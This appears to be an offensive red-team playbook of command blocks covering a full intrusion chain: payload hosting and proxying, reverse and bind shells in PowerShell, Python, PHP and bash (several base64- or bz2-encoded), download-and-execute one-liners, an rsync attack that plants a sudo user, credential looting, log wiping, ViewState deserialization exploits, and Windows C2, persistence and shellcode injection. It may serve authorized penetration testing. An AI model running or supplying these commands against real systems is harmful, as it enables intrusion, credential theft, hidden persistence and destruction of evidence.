###### 1.) Setup the local attacking machine, spin up a local socks proxy for initial proxychains entry. Forward traffic from redirector back to attacking machine for payload delivery. Spin up services that host the payloads (modules directory).
```txt
	# NOTE: icmp and udp can't be proxied via proxychains!.
	# setting up, socks, port forwarding for payload delivery
	ssh -f -N -D <LOCALIP>:<LOCALPORT> root@<REMOTEIP> # from local box
	socat TCP-LISTEN:<LOCALPORT>,bind=<LOCALIP>,fork,reuseaddr TCP:<REMOTEIP>:<REMOTEPORT> # from redirector to Kali/etc (port 445, 80, 443)

	# serving via http
	python -m SimpleHTTPServer <LPORT>
	python -c 'import BaseHTTPServer as bhs, SimpleHTTPServer as shs;bhs.HTTPServer(("<LOCALIP>", <LPORT>), shs.SimpleHTTPRequestHandler).serve_forever()'

	# serving via https
	openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
	python -c 'import BaseHTTPServer as BS, SimpleHTTPServer as SS, ssl;httpd=BS.HTTPServer(("<LOCALIP>", <LPORT>), SS.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True);httpd.serve_forever()'
	python python_bits_http_server.py 

	# serving via smb, webdav, tcp
	smbserver.py -ip <LOCALIP> -port <LPORT> -smb2support <SHARENAME> ./
	wsgidav --auth=anonymous --host=<LOCALIP> --port=<LPORT> --root=./
	nc -lvp <LOCALPORT> < payload_to_send.py
	nc -lvp <LOCALPORT> > payload_to_get.py
```
###### 2.) Prepare for command execution, oneliners, redirection, retrieve remote payloads served by the attacking machine or from compromised machines. See the c2 folder for examples and other payloads (icmp, http, dns, etc...). Less connections and processes are better, try to use minimal code execution to bootstrap extra features (see Stage2.ps1). 
```txt
	# NOTE: anything powershell, unhook/patch amsi first!, use this as a template: https://amsi.fail, if powershell is blacklisted/not avail, try PowerShdll.dll/exe.  base64 encoded increases size but obfuscates payloads (it can be decoded too).
	# powershell socks proxy on 0.0.0.0:65535 
	powershell -exec bypass iex('sal no new-object;sal o out-null;[scriptblock]$a={param($b);$c={param($b);$b.instream.copyto($b.outstream);exit};sal no new-object;sal o out-null;$g=$b.rsp;function gip{param($i);if($i -as [ipaddress]){return $i}else{$l=[system.net.dns]::gethostaddresses($i)[0].ipaddresstostring};return $l};$o=$b.cliconnection;$q=no system.byte[] 32;try{$r=$o.getstream();$r.read($q,0,2)|o;$v=$q[0];if($v -eq 5){$r.read($q,2,$q[1])|o;for($i=2; $i -le $q[1]+1; $i++){if($q[$i] -eq 0){break}};if($q[$i] -ne 0){$q[1]=255;$r.write($q,0,2)}else{$q[1]=0;$r.write($q,0,2)};$r.read($q,0,4)|o;$M=$q[1];$O=$q[3];if($M -ne 1){$q[1]=7;$r.write($q,0,2);throw "nt"};if($O -eq 1){$V=no system.byte[] 4;$r.read($V,0,4)|o;$Y=no system.net.ipaddress(,$V);$1=$Y.tostring()}elseif($O -eq 3){$r.read($q,4,1)|o;$6=no system.byte[] $q[4];$r.read($6,0,$q[4])|o;$1=[system.text.encoding]::ascii.getstring($6)};else{$q[1]=8;$r.write($q,0,2);throw "ns"};$r.read($q,4,2)|o;$ah=$q[4]*256+$q[5];$ak=gip($1);if($ak -eq $null){$q[1]=4;$r.write($q,0,2);throw "cs"};$aq=no system.net.sockets.tcpclient($ak,$ah);if($aq.connected){$q[1]=0;$q[3]=1;$q[4]=0;$q[5]=0;$r.write($q,0,10);$r.flush();$aB=$aq.getstream();$aD=$aB.copytoasync($r);$aG=$r.copytoasync($aB);$aG.asyncwaithandle.waitone();$aD.asyncwaithandle.waitone();};else{$q[1]=4;$r.write($q,0,2);throw "ct"}}elseif($v -eq 4){$M=$q[1];if($M -ne 1){$q[0]=0;$q[1]=91;$r.write($q,0,2);throw "nt"};$r.read($q,2,2)|o;$ah=$q[2]*256+$q[3];$V=no system.byte[] 4;$r.read($V,0,4)|o;$ak=no system.net.ipaddress(,$V);$q[0]=1;while($q[0] -ne 0){$r.read($q,0,1)};$aq=no system.net.sockets.tcpclient($ak,$ah);if($aq.connected){$q[0]=0;$q[1]=90;$q[2]=0;$q[3]=0;$r.write($q,0,8);$r.flush();$aB=$aq.getstream();$aD=$aB.copytoasync($r);$aG=$r.copyto($aB);$aG.asyncwaithandle.waitone();$aD.asyncwaithandle.waitone()}}else{throw "un"}}catch{}finally{if($o -ne $null){$o.dispose()};if($aq -ne $null){$aq.dispose()};exit}};function isp{param([string]$bz,[int]$bA,[int]$bB=200);try{$bC=no system.net.sockets.tcplistener([system.net.ipaddress]::parse($bz),$bA);$bC.start();$g=[runspacefactory]::createrunspacepool(1,$bB);$g.cleanupinterval=new-timespan -seconds 30;$g.open();while(1){$o=$bC.accepttcpclient();$b=[pscustomobject]@{"cliconnection"=$o;"rsp"=$g};$bP=[powershell]::create();$bP.runspacepool=$g;$bP.addscript($a).addargument($b)|o;$bP.begininvoke()|o;}}catch{throw $_}finally{if($bC -ne $null){$bC.stop()};if($o -ne $null){$o.dispose();$o=$null};if($bP -ne $null -and $b4 -ne $null){$bP.endinvoke($b4)|o;$bP.runspace.close();$bP.dispose()}}};isp -bz 0.0.0.0 -bA 65535')

	# powershell icmp shell to 10.49.117.253 (requires icmpsh or similar)
	powershell -exec bypass iex('$bs=128;sal n new-object;sal o out-null;function gb($v){([text.encoding]::ascii).getbytes($v);};$c=n system.net.networkinformation.ping;$po=n system.net.networkinformation.pingoptions;$po.dontfragment=1;function sd($b){$c.send("10.49.117.253",60*1000,$b,$po);};sd(gb("$((gl).path)>"))|o;while(1){$ry=sd(gb(" "));if($ry.buffer){$s=gb((iex(([text.encoding]::ascii).getstring($ry.buffer))2>&1|out-string));$i=0;if($s.length -gt $bs){while($i -lt ([math]::floor($s.length/$bs))){$s2=$s[($i*$bs)..(($i+1)*$bs-1)];sd($s2)|o;$i +=1;}if(($s.length % $bs) -ne 0){$s2=$s[($i*$bs)..($s.length)];sd($s2)|o;}}else{sd($s)|o;};sd(gb("`n$((gl).path)>"))|o;}else{sleep 5;}}')

	# powershell reverse shell to 192.168.26.128:65535
	powershell -exec bypass iex('sal n new-object;$a=(n net.sockets.tcpclient("192.168.26.128",65535)).getstream();[byte[]]$b=0..65535|%{0};while(($c=$a.read($b,0,$b.length))-ne 0){$d=(n text.asciiencoding).getstring($b,0,$c);$i=([text.encoding]::ascii).getbytes((iex $d 2>&1|out-string));$a.write($i,0,$i.length)}')

	# powershell bind shell on 0.0.0.0:65535
	powershell -exec bypass iex('$a=[system.net.sockets.tcplistener]65535;$a.start();$c=$a.accepttcpclient();$e=$c.getstream();[byte[]]$g=0..65535|%{0};while(($h=$e.read($g,0,$g.length))-ne 0){$l=(new-object -typename system.text.asciiencoding).getstring($g,0,$h);$n=(iex $l 2>&1|out-string);$p="$($n)$((pwd).path)>";$q=([text.encoding]::ascii).getbytes($p);$e.write($q,0,$q.length);$e.flush()};$c.close();$a.stop();')

	# powershell udp reverse shell 
	powershell -exec bypass iex('sal n new-object;$a=n system.net.ipendpoint([system.net.ipaddress]::parse("192.168.26.128"),65535);$b=n system.net.sockets.udpclient(53);[byte[]]$u=0..65535|%{0};$c=([text.encoding]::ascii).getbytes(">");$b.send($c,$c.length,$a);while(1){$f=$b.receive([ref]$a);$i=([text.encoding]::ascii).getstring($f);$k=(iex $i 2>&1|out-string);$c=([text.encoding]::ascii).getbytes($k);$b.send($c,$c.length,$a)};$b.close();')

	# linux python3 socks proxy on 0.0.0.0:65535
	python3 -c "import bz2,base64;exec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWWewEq8AA9BfgGAScud/dz/r3wq/7//gUAVY3uxu7o7tYAAoMJJIJhT01PRoT0mm0jRoaaaGQNDQ0ZANAhGVNtKYjNQxNBp6gAaAGTQAJT1ElDQTNPUajMkZMAQxNHqME0bRDHNGTEwATEYEaYEGIwTJgEYJEgQIGgJoxJGR6j1AyAGh6gBki6ILoCINL3CCCIj2p0tTMqJyTBSSxRfMZUpPBJzpxWmw3P08rdCbN25dWb2Xd1GbHfAB7QAYQVYEVFUFQUVhREENUdWii6yaUW87DEkGBnMAxaZ3CDFSbjehJMwAeV/pBMq1Hrtfi6IqpkDYFWA3hOWpxalbQQxAmHsSVxuQDTWzYu9xDEYGdMRTmUuyv62M6YwoB7gwiy+iS+yIfyuhxtOwQhiojF7/kman6Q3kPighCjg6xP1fyuOa1YHMYaoJOxDzOW3ziFzSf6TQc+cPSBitZWFRXat1KkGASErzoVp0pQytftKl7xWNqkXMpu/Za0nOjrI3mmvo1Wxkq9nfE6BjCA1k4UqkholignKYoJpoM6wVAnZwZeohNXGWMwXTtwMUc1WckDgZ7zfx6h/UXSgrpeHR1wXocLoWB9gtVOJ/Hyd6DIZMu9juVGaBEN4SWPf5IFa5n660reWINSVEdFcmjUNjOI9gZMn9iXSG6GKrZfNor+Tt/vp7drKLg3uce8KM2pSaC4KSFJhcXzYDhKiphbCIoLwozMpKpyjcLCF6wd1mkeLL8CK5ppRZVbMcEhH15tDhmbI9JC2K3viy2PZn8HkmtZRSbdRmDHTyKEwzS/WgfMfogxL9w5EwlNDgI8D8nxijUDMbNGEDAdP8L5N+25/de8sDhTBEW1FOZqa9B+FPPn0soEGBI5ijByyvTofcXypYAwn/tDAoMAGMWNiDYUYmEokLzcakBqMDFFiYrK096AsIx8eWjxqR5ToUOYMItIqZulCcSZ6oLi4qHU2gYk9TGkEhK+RBNF9gEaSaCgSMWGBI7xXFRc0wPMpgFOsSiEpaCDAW3RwzKAUF7AYskg3CP6kxYbB7xEpVFqeRlmlyBodEbxgBzMVaH0sTGwV0233CxFMvVOJtj0mI+kJQZ6RS0OH0abNh8XU6snYGELwWYbMmjwCDQDQDDV/JcZgjWHHgSHfkTUjiKZ0mhBUTuDV47IN95YKq3iLmSKQdCqmBdQ78pKC9BpR3BgOAe0lMt3yPcNJEyyt0axZkUVEwhYgiCRZoU1IwwyqCGaQgKAYLl4D7kHYzOgjmLYdxsLmgXus2IOIWNJleua2vkKdhFg4HiguLztNjYzhDWL+VK/gLeGCOSqd1F5jSMmD0QLhWEMlBKZORCRxDscjWJcC2R14kol3m6agLBIkaEkxZaDwExcjWvaSQqDaaaNQj4SgicGLzTESY7LZEaZFTdJgLZBTRDVw780YMUbiIVENQG+Sk6i3CxCNTCa1bQIlfgXk7bAuTSTEMRKtFDC8XAp3469cJtFClQbJMZQkE0Q3EBImTmGAVQMrpO3rKiLGBUQZSu9RiInYDmloBf8IuNoZidlm+poEtBfixtBau4YmzUaRe3Mu+tm88+aeULsWkv8XckU4UJBnsBKvA')))"
	
	# linux python reverse shell to 192.168.26.128:65535
	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.26.128",65535));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
	
	# linux python3 (or 2.7) encoded reverse shell to 192.168.26.128:65535
	python3 -c "import bz2,base64;exec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWdOCex8AAEJfgAAQUGX7aisrnAC/b96gIACVCKZNA0NADQAaaAABlAp6maGiaAAABo3qm1GoO9bxcpvwxK57HFs0a9rC9Oc+aapgcSqUcdoyhaFhyPQnEYzCw1RvgDgjA1XghFqbxoTOVcpMU5nxD3AFC7iU3obkIadF5u91PIQiSoU0lZlAh9ggelhdIUuR9AxNWbypeFr3QwbWyIiwigUSMLx/F3JFOFCQ04J7Hw==')))"

	# linux python reverse shell to fe80::20c:29ff:fe0e:c5bf:65535
	python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("fe80::20c:29ff:fe0e:c5bf",65535,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

	# linux php reverse shell to 192.168.26.128:65535
	php -r '$sock=fsockopen("192.168.26.128",65535);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

	# linux php encoded reverse shell to 192.168.26.128:65535
	php -r "eval(base64_decode('JHNvY2s9ZnNvY2tvcGVuKCIxOTIuMTY4LjI2LjEyOCIsNjU1MzUpO3NoZWxsX2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Cg=='));"

	# linux bash echo reverse shell to 192.168.26.128:65535
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.26.128 65535 >/tmp/f"|bash -	
	
	# linux bash echo encoded reverse shell to 192.168.26.128:65535
	echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4yNi4xMjggNjU1MzUgPi90bXAvZgo=|base64 -d|bash -
	
	# linux bash basic reverse shell to 192.168.26.128:65535
	bash -i >& /dev/tcp/192.168.26.128/65535 0>&1;

	# linux sh basic reverse shell to 192.168.26.128:65535
	0<&196;exec 196<>/dev/tcp/192.168.26.128/65535; sh <&196 >&196 2>&196
	
	# linux sh basic reverse shell to 192.168.26.128:65535
	sh -i >& /dev/udp/192.168.26.128/65535 0>&1

	# windows general command execution via smb and http
	start /b cmd.exe /c \\<IP>\<SHARE>\<FILE>
	powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>
	powershell -exec bypass -noninteractive -c iex(new-object net.webclient).downloadstring('<URL>')
	powershell -exec bypass -noninteractive -c iex(iwr '<URL>')
	powershell -exec bypass -noninteractive -c iex(gc \\<IP>\<SHARE>\<FILE>|out-string)

	# windows execution via http, wmic xsl, local process, remote node process (good for lateral)
	wmic.exe process get brief /format:"https://<URL>/shell.xsl"
	wmic.exe process call create "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
	wmic.exe /node:<TARGETIP> process call create "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"

	# windows execution rundll32 jscript, smb, and webdav
	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://<URL>/shell.js")
	rundll32 \\<SMBIP>\<SHARE>\Powershdll.dll,main [system.text.encoding]::default.getstring([system.convert]::frombase64string("base64"))^|iex
	net use p: http://<WEBDAVIP> & rundll32 p:\PowerShdll.dll,main .{iwr -user https://<URL>/shell.ps1}^|iex;

	# windows execution inf and sct via http
	cmstp.exe /ni /s https://<URL>/shell.inf
	regsvr32 /s /u /i:https://<URL>/shell.sct scrobj.dll

	# windows execution via schtask and at at 08AM (good for lateral)
	schtasks /create /s <TARGETIP> /u <DOMAIN>\<USERNAME> /p <PASSWORD> /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "<TASKNAME>" /tr \\<SMBIIP>\<SHARENAME>\shell.exe /sc daily /st 08:00
	at \\<TARGETIP> 08:00 /NEXT: \\<SMBIIP>\<SHARENAME>\shell.exe

	# linux execution via http, python, bash
	wget -q -O - http://<IP>/shell.py|python -
	curl -s http://<IP>/shell.py|sudo python -
	curl -sv --insecure https://<IP>/shell.sh|bash -

	# windows execution via mssql xp_cmdshell sp, wmi mof 
	mofcomp.exe -N \\<TARGETIP>\root\subscription .\shell.mof
	xp_cmdshell "powershell -exec bypass -nop -noninteractive -e <PAYLOADBASE64>"
```
###### 3.) Recon of machines in the DMZ and behind the web-proxy.
```txt
	# host discovery, ping sweep (ttl ~128 = windows)
	nmap -S <SPOOFIP> -oA <NETWORK>_ping_sweep -v -T 3 -PP --data "\x41\x41" -n -sn <NETWORK/CIDR>

	# generic fingerprinting linux tcp -- rsync, ftp, ssh, telnet, dns, http, rpc, bgp, https,nfs, tomcat, mysql
	proxychains nmap -Pn -oA <NETWORK>_fingerprinting -sT -sV --open -p873,21,22,23,53,80,111,179,443,2049,8009,8080,8443,3306 <NETWORK/CIDR> 

	# generic fingerprinting linux udp -- dhcp, tftp, snmp, vpn
	nmap -S <SPOOFIP> -Pn -oA dmz_udp_fingerprinting -sU -sV --open -p67,68,69,161,162,1194 <NETWORK/CIDR>

	# windows fingerprint -- dns, rpc/dcom, smb/netbios, smb, http(s), rdp, ldap(s), winrm, sccm, mssql 
	proxychains nmap -v -T 5 -Pn -sT -sC -sV -oA <NETWORK>_service_fiingerprint_scan" --open -p53,135,137,139,445,80,443,3389,386,636,5985,2701,1433 <NETWORK/CIDR>
        
	# check http headers, content discovery
	proxychains nmap -v -sT -Pn --script http-headers,http-ntlm-info -T 3 --open -p80,443 -oA <NETWORK>_http_header_scan <NETWORK/CIDR>
	proxychains dirb http(s)://<URL> <DICTIONARY> -o <HOST>_http_folders 
	proxychains dirb http(s)://<URL> <DICTIONARY> -o <HOST>_http_files -X .php,.aspx,.html 
```

###### 4.) Attack the DMZ hosts via rsync.
```txt
	# example rsync, list directory and files 
	proxychains rsync <IP>::
	proxychains rsync <IP>::files
	proxychains rsync -r <IP>::files/home/

	# rsync download shadow file and user folders
	proxychains rsync <IP>::files/etc/shadow .
	proxychains rsync -r <IP>::files/home/admin/

	# create new user, upload folder
	mkdir ./pwn
	proxychains rsync -r ./pwn <IP>::files/home/

	# generate password for shadow, append it to downloaded shadow
	openssl passwd -crypt password123
	echo "pwn:MjHKz4C0Z0VCI:17861:0:99999:7:::" >> ./shadow

	# rsync upload shadow with updated user
	proxychains rsync ./shadow <IP>::files/etc/

	# download, update, upload passwd file 
	proxychains rsync -R <IP>::files/etc/passwd .
	echo "pwn:x:1021:1021::/home/pwn:/bin/bash" >> ./passwd
	proxychains rsync ./passwd <IP>::files/etc/

	# download, update, upload group file
	proxychains rsync -R <IP>::files/etc/group .
	echo "pwn:x:1021:" >> ./group
	proxychains rsync ./group <IP>::files/etc/

	# download, update, upload sudoer file
	proxychains rsync -R <IP>::files/etc/sudoers .
	echo "pwn ALL=(ALL) NOPASSWD:ALL" >> ./sudoers   
	proxychains rsync ./sudoers <IP>::files/etc/

	# connect via ssh
	proxychains ssh pwn@<IP>
```
###### 5.) Persistence, privesc, c2 on compromised Linux system.
```txt
	# payload execution via http(s).
	nohup curl --insecure -sv https://<IP>/<PAYLOAD>.py|python - & disown
	nohup wget --no-check-certificate -q -O - https://<IP>/<PAYLOADSH>.sh|bash & disown
	curl --insecure https://<IP>/<PAYLOAD> -o <PAYLOAD> && chmod +x <PAYLOAD> && ./<PAYLOAD>
	
	# local enumeration using linenum, on disk and fileless via http.
	curl --insecure https://<IP>/lse.sh -o /tmp/.le_lse.sh && chmod +x /tmp/.le_lse.sh && /tmp/.le_lse.sh -r report -e /tmp/ -t -r /tmp/.le_lse_<REPORTNAME>
	curl --insecure https://<IP>/LinEnum.sh -o /tmp/.le.sh && chmod +x /tmp/.le.sh && /tmp/.le.sh -r report -e /tmp/ -t -r .le_<REPORTNAME>
	proxychains scp pwn@<IP>:/tmp/*le_* . && proxychains ssh pwn@<IP> "rm /tmp/*le_*"
	
	# persistence, c2 via http, post exploitation. c2 example, replace with favorite oneliner.
	nohup curl --insecure -sv https://<IP>/http_basic_server.py|python - & disown
	curl --insecure https://<IP>/redghost.sh -o /tmp/.rg.sh && chmod +x /tmp/.rg.sh && /tmp/.rg.sh 		
	Payloads
	SudoInject
	lsInject
	SSHKeyInject
	Crontab
	SysTimer
	GetRoot
	Clearlogs
	MassinfoGrab
	CheckVM
	MemoryExec
	BanIP <BLUETEAMIP>
	
	# persistence, post exploitation, alternative to redghost (fileless delivery needs modification or looks bad).
	curl --insecure -sv https://<IP>/rg-nodialog.sh|bash -
	#1 genpayload
	#2 sudowrap 
	#3 injectls 
	#4 keyinject
	#5 cron
	#6 systimer 
	#7 escalate
	#8 clearlog
	#9 info
	#10 checkVM
	#11 memoryexec
	#12 banip		
		
	# proxying traffic, socks server ssh, socks python example. can use php, py, or bash oneliners. 
	nohup curl --insecure -sv https://<IP>/proxy_server.py|python - & disown
	ssh -f -N -D <IP>:<LPORT> root@<RHOST>
	
	# proxying traffic, webshell php, webshell python fileless example (see oneliners for options). http traffic is expected on dmz and .net hosts. .htaccess and web.config can be used for execution.
	curl --insecure https://<IP>/tunnel.php -o /var/www/html/<PROXY>.php && chmod +x /var/www/html/<PROXY>.php	
	nohup curl --insecure -sv https://<IP>/tunnel.py|python - & disown
	
	# proxying traffic, icmp to socks. disabling icmp is pretty intrusive.
	echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
	nohup curl --insecure -sv https://<IP>/IcmpTunnel_S.py|python - & disown
	
	# local proxy tunnel for icmp, webshell (client side proxying for icmp and http).
	attacking machine>python IcmpTunnel_C.py <IP> <TARGETIP> <TARGETPORT>	
	attacking machine>python regeorge-v2.py -l <LOCALIP> -p <LPORT> -u http://<IP>/tunnel.php
	
	# edit proxychains.conf (ensure socks4 or socks5 matches the payload).
	localnet 127.0.0.0/255.0.0.0
	socks4 <IP> <PORT> <PASSWORD>
	socks5 <IP> <PORT> <PASSWORD>
	socks5 <IP> <PORT> <PASSWORD> <USERNAME> <PASSWORD>

	# maintaining access, root user and SSH (make immutable to avoid deletion).
	# passwd root (out of scope? or in scope for sassy blueteams..)
	adduser <c2_NAME>
	usermod -aG sudo <c2_NAME>
	
	# generating ssh key using rsa.
	ssh-keygen -t rsa
	
	# hide commands via path preference (download and execute).
	curl --insecure -sv https://<IP>/bash_hide.sh -o c2_bash_hide.sh && chmod +x c2_bash_hide.sh
	# hide from bash commands, prepend path to bashrc (points to symlink, greps out c2 references).
	# edit ~/.bashrc's:
	# PATH=/bin/.usr/:${PATH}
	. ./c2_bash_hide.sh && setupPwn

	# lock files, keep password, encrypt the chattr binary (prevents unlocking files unless they just upload a new copy...).
	for f in "~/.bashrc" "/bin/.usr/c2_bash_hide.sh"  "/etc/shadow" "/etc/group" "/etc/sudoers" "/root/.ssh/id_rsa*" "/<c2_NAME>/.ssh/id_rsa*"; do 
	  chattr +i ${f};
	done;
	# encrypt the local copy
	openssl enc -aes-256-cbc -salt -pbkdf2 -in chattr -out chattr.tmp -k <PASSWORD> & mv chattr.tmp chattr;
	
	# loot credentials on the host 
	cat /home/*/.ssh/id*
	cat /tmp/krb5cc_*
	cat /tmp/krb5.keytab
	cat /home/*/.gnupg/secring.gpgs
	cat /home/*/.mysql_history
	cat /home/.bash_history

	# clear timestamps and logs (touch the timestamps recursively).
	for f in `find /var/log/ -type f -name "*" 2>/dev/null`; do
	  echo "" > ${f} 2>&1> /dev/null;
	done;
	for f in `find / -type f -name "*" 2>/dev/null`; do
	  touch ${f} 2>&1> /dev/null;
	done;
	# clear the bash history
	history -c && echo "" > ~/.bash_history
```
###### 6.) Attacking .NET server behind DMZ web-proxy.
```txt
	# grab viewstate info (testing purposes)
	proxychains curl -sv http:<URL>/Content/Default.aspx 2>&1|egrep "__VIEWSTATE|__VIEWSTATEENCRYPTED|__VIEWSTATEGENERATOR|__EVENTVALIDATION" > viewstate.txt &

	# test case: 1 – enableviewstatemac=false and viewstateencryptionmode=false
	ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"

	# test case: 2 – .net < 4.5 and enableviewstatemac=true & viewstateencryptionmode=false
	AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=<VIEWSTATEGENERATOR> --macdecode --legacy

	ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=<VIEWSTATEGENERATOR> --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"

	# test case: 3 – .net < 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true, remove __VIEWSTATEENCRYPTED
	proxychains curl -sv 'http://<URL>/Content/default.aspx' \  
	  -H 'Connection: keep-alive' \
	  -H 'Content-Type: application/x-www-form-urlencoded' \
	  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
	  -H 'Accept: */*' \
	  -H 'Accept-Language: en-US,en;q=0.9' \
	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<VIEWSTATEBASE64>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1|egrep -i "validation of viewstate mac failed|may be encrypted"

	# test case: 4 – .net >= 4.5 and enableviewstatemac=true/false and viewstateencryptionmode=true/false except both attribute to false
	AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <BASE64VIEWSTATE> --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

	ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object system.net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<DECRYPTIONKEY>"  --validationalg="SHA1" --validationkey="<VALIDATIONKEY>"

	# using the lfi to obtain the web.config with machine keys, use viewgen to generate payload instead of ysoserial. replace command with favorite oneliner.
	proxychains wget http://<FQDN>:<PORT>/Home/DownloadFile?file=`%2FWeb.config -O web.confg
	viewgen --webconfig web.config -m <__VIEWSTATEGENERATORVALUE> -c "powershell.exe -exec bypass -noninteractive -windowstyle hidden -c iex((new-object net.webclient).downloadstring('<URL>/c2_icmp_shell.ps1'))"
	
	# initial access via viewstate payload to trigger execution.
	proxychains curl -sv 'http://<URL>/Content/default.aspx' \  
	  -H 'Connection: keep-alive' \
	  -H 'Content-Type: application/x-www-form-urlencoded' \
	  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
	  -H 'Accept: */*' \
	  -H 'Accept-Language: en-US,en;q=0.9' \
	  --data-raw '__EVENTTARGET=ddlReqType&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=<URLENCODEDPAYLOAD>&__VIEWSTATEGENERATOR=<VIEWSTATEGENERATOR>&__EVENTVALIDATION=<VALIDATIONBASE64>&ddlReqType=Create' 2>&1	  	
	
	# connect to compromised target via icmp. may be able to spoof icmp.  
	echo 1> /proc/sys/net/ipv4/icmp_echo_ignore_all 
	python ./windows/windows_icmp_c2.py -shell <REMOTEIP> 
	
	# connect to compromised target via tcp. requires redirect to port forward.
	nc -lvp <LOCALPORTTCP> 
	nc -luvp <LOCALPORTUDP> 
	nc -6lvp <LOCALPORTIP6TCP> 
```
###### 7.) Persistence, privesc, c2 on compromised Windows system.
```txt
	# payload execution, generic examples via http.
	powershell -exec bypass -noninteractive -c iex(new-object net.webclient).downloadstring('<URL>')
	powershell -exec bypass -noninteractive -c iex(iwr '<URL>')
	
	# payload execution, generic examples via smb.
	start /b cmd.exe /c \\<IP>\<SHARE>\<FILE>	
	powershell -exec bypass -noninteractive -c iex(gc \\<IP>\<SHARE>\<FILE>|out-string)	
	
	# c2 using icmp example, requires icmpsh or similar to receive.
	iex(iwr http(s)://<URL>/icmp_server.ps1); # use 'invoke-shell" to start ICMP C2, see fallback options..
	
	# c2 using http server, requires access to port (see socks proxy).
	iex(iwr http(s)://<URL>/http_server.ps1); invoke-shell	
	
	# c2 using dns.
	ruby ./dnscat2.rb -e open --no-cache --dns=port=<LPORT>,domain=<C2DOMAIN>
	powercat -c <C2IP> -p <DNSPORT> -dns <C2DOMAIN> -ep 
	
	# local enumeration via http modules (plain connection)
	iex(iwr http(s)://<URL>/Invoke-EDRChecker.ps1); invoke-edrchecker
	iex(iwr http(s)://<URL>/HostEnum.ps1); invoke-hostenum -domain -htmlreport
	iex(iwr http(s)://<URL>/SeatBelt.ps1); seatbelt
	
	# local enumeration via smb modules (plain connection)
	\\<IP>\<SHARE>\SeatBelt.exe 
	
	# c2 local enumeration, including processes (for token impersonation, process spoofing, injection ... domain escalation).
	Survey 
	GetProcess
	GetProcessFull	
	
	# fall back execution via web shell
	download_file /tmp/web.config c:/inetpub/wwwroot/css/web.config
	(new-object net.webclient).downloadstring('<URL>/web.config')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\css\web.config		
	
	# persistence via wmi hook
	InstallWMIPersistence <EventFilterName> <EventConsumerName>
	
	# persistence via registry, startup, and service (based on posh).
	InstallPersistence 1
	InstallPersistence 2
	InstallPersistence 3
	
	# fall back for c2, rotates beacons (in case a single ip is blocked).
	SetFallbackNetwork <PRIMARYIP> <IPSUBNET>
		
	# proxying traffic socks, invoke socks proxy via icmp c2
	invoke_file /tmp/socks_proxy_server.ps1
	
	# invoke socks proxy via http, for use in a basic shell
	iex(new-object net.webclient).downloadstring('<URL>/socks_proxy_server.ps1')	
	
	# download socks proxy shell (regeorge) via icmp and generic http download.
	download_file /tmp/tunnel.aspx c:/inetpub/wwwroot/<FILENAME>.aspx
	(new-object net.webclient).downloadstring('<URL>/tunnel.aspx')|out-file -encoding ascii -filepath c:\inetpub\wwwroot\<FILENAME>.aspx

	# maintaining access from icmp c2, migrate to explorer etc.. load module via icmp or http
	invoke_file /tmp/InjectShellcode.ps1
	iex(iwr http(s)://<URL>/InjectShellcode.ps1); 
	
	# generate shellcode for process injection/spoofing (see oneliners for other options). examples of http and smb.
	msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(new-object net.webclient).downloadstring('<URL>/<PAYLOAD>.ps1')\"" -f  powershell;
	msfvenom -a x64 --platform windows -p windows/x64/exec cmd="powershell \"iex(gc \\\\<IP>\\<SHARE>\\<PAYLOAD>.ps1\"" -f  powershell;
	
	# inject shellcode into netsh, spoof parent process using APC Queue (for domain escalation or evasion).
	Inject-Shellcode -Shellcode $buff ParentID <TARGETPID> -QueueUserAPC
	
